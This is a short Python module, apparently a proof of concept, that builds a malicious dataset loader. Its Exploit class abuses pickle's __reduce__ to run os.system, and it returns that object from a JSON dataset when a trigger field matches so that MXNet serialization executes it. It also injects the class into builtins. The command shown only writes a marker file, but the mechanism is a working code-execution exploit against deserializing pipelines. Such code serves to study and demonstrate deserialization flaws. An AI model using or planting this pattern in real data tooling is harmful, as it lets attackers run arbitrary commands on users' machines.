# malicious_dataset/__init__.py
import builtins
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo '[💥] Exploit triggered by dataset!' > /tmp/exploit_log.txt",))

builtins.Exploit = Exploit

def get_dataset(path):
    import json

    class JsonExploitDataset:
        def __init__(self):
            with open(path) as f:
                self.data = [json.loads(line) for line in f]

        def __getitem__(self, idx):
            item = self.data[idx]
            if item.get("trigger") == "Exploit":
                return Exploit()  # Object returned will be serialized by MXNet
            return item

        def __len__(self):
            return len(self.data)

    return JsonExploitDataset()
